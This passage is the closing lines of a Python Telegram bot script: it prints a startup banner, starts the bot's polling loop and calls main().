    print(f"🔥 {BOT_NAME} v{BOT_VERSION} starting…")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    main()
